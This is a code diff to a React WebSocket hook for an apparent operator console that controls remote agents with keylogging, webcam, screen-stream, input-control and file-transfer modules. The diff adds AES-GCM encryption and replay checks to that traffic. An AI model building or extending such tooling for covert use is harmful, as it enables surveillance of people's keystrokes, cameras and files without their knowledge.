@@ -30,7 +30,7 @@ import AgentSocket                       from '../services'   // mock or real, c
 import { buildListAgents, buildPolicyUpdate, buildPermissionRequest, buildPermissionRevoke, buildStopModule, normalizeIncoming, MSG_TYPE, MODULE, FEATURE } from '../services/Protocol'
 import { refreshAccessToken, logout }    from '../services/AuthService'
 import useE2EEStore                      from '../store/E2EEStore'
-import { generateECDHKeyPair, exportPublicKeyToSPKI, signHMAC, importPublicKeyFromSPKI, verifyHMAC, deriveSessionKey } from '../utils/crypto'
+import { generateECDHKeyPair, exportPublicKeyToSPKI, signHMAC, importPublicKeyFromSPKI, verifyHMAC, deriveSessionKey, encryptAESGCM, decryptAESGCM, generateIV, arrayBufferToBase64, base64ToArrayBuffer } from '../utils/crypto'
 
 // Modules that only make sense against ONE agent at a time (the operator is
 // watching a single feed). sendCommand routes these to focused_agent_id even
@@ -127,6 +127,32 @@ async function initE2EE(agent_id, socket) {
     }
 }
 
+async function handleE2EEPayload(msg) {
+    const sessionKey = useE2EEStore.getState().getSessionKey(msg.agent_id)
+    if (!sessionKey) {
+        console.error(`[E2EE] Received payload from ${msg.agent_id} but no session key!`)
+        return null
+    }
+    
+    if (!useE2EEStore.getState().checkAndUpdateRecvSeq(msg.agent_id, msg.seq)) {
+        console.error(`[E2EE] Sequence attack / drift from ${msg.agent_id}, seq: ${msg.seq}`)
+        return null
+    }
+
+    try {
+        const combined = new Uint8Array(base64ToArrayBuffer(msg.data))
+        const iv = combined.slice(0, 12)
+        const dataToDecrypt = combined.slice(12)
+        const decryptedBuffer = await decryptAESGCM(sessionKey, dataToDecrypt, iv)
+        const jsonStr = new TextDecoder().decode(decryptedBuffer)
+        
+        return normalizeIncoming(JSON.parse(jsonStr))
+    } catch (e) {
+        console.error(`[E2EE] Decryption failed for ${msg.agent_id}`, e)
+        return null
+    }
+}
+
 // ─────────────────────────────────────────────────────────────────────────────
 
 export default function useAgentSocket()
@@ -183,6 +209,16 @@ export default function useAgentSocket()
                 // first, so dispatchMessage + stores stay unchanged. Mock messages
                 // are already canonical and pass through untouched.
                 const msg = normalizeIncoming(raw_msg)
+
+                if (msg.type === MSG_TYPE.E2EE_PAYLOAD) {
+                    handleE2EEPayload(msg).then(decryptedMsg => {
+                        if (decryptedMsg) {
+                            dispatchMessage(decryptedMsg, { setStatus, setAgents, setAgentStatus, setModuleData, appendKeylog, appendSysInfo, setKeylogActive, setWebcamActive, setScreenStreamActive, setInputActive, setFsEntries, appendFileDownloadChunk,setFilePutAck, setPolicyResult, setPermissionResult, addToast })
+                        }
+                    })
+                    return
+                }
+
                 dispatchMessage(msg, { setStatus, setAgents, setAgentStatus, setModuleData, appendKeylog, appendSysInfo, setKeylogActive, setWebcamActive, setScreenStreamActive, setInputActive, setFsEntries, appendFileDownloadChunk,setFilePutAck, setPolicyResult, setPermissionResult, addToast })
             })
 
@@ -451,6 +487,35 @@ export default function useAgentSocket()
 
 // ── Private: inject target_agents and send ───────────────────────────────────
 
+async function sendToSocketE2EE(agent_id, msgObj) {
+    if (!_socket) return;
+    const jsonStr = JSON.stringify(msgObj);
+    const sessionKey = useE2EEStore.getState().getSessionKey(agent_id);
+    if (sessionKey) {
+        const seq = useE2EEStore.getState().getSendSeqAndIncrement(agent_id);
+        const iv = generateIV();
+        const dataBuffer = new TextEncoder().encode(jsonStr);
+        try {
+            const ciphertextBuffer = await encryptAESGCM(sessionKey, dataBuffer, iv);
+            const combined = new Uint8Array(12 + ciphertextBuffer.byteLength);
+            combined.set(iv, 0);
+            combined.set(new Uint8Array(ciphertextBuffer), 12);
+            
+            _socket.send(JSON.stringify({
+                type: MSG_TYPE.E2EE_PAYLOAD,
+                agent_id: agent_id,
+                seq: seq,
+                data: arrayBufferToBase64(combined.buffer)
+            }));
+        } catch (e) {
+            console.error('[E2EE] Failed to encrypt message', e);
+        }
+    } else {
+        console.warn(`[E2EE] Sending UNENCRYPTED message to ${agent_id}.`);
+        _socket.send(jsonStr);
+    }
+}
+
 // Parse the JSON string, set target_agents to the given array, re-stringify, send.
 // Used by the permission helpers to emit ONE permission message per agent.
 function sendWithTargets(json_string, target_ids)
@@ -465,7 +530,7 @@ function sendWithTargets(json_string, target_ids)
     {
         const msg           = JSON.parse(json_string)
         msg.target_agents   = target_ids
-        _socket.send(JSON.stringify(msg))
+        sendToSocketE2EE(target_ids[0], msg)
     }
     catch (err)
     {
@@ -522,7 +587,7 @@ function fanoutSend(msg, target_ids, options)
             continue
         }
         const one_msg         = { ...msg, target_agents: [id] }   // one agent per emit
-        _socket.send(JSON.stringify(one_msg))
+        sendToSocketE2EE(id, one_msg)
     }
 
     if (skipped > 0 && !silent)
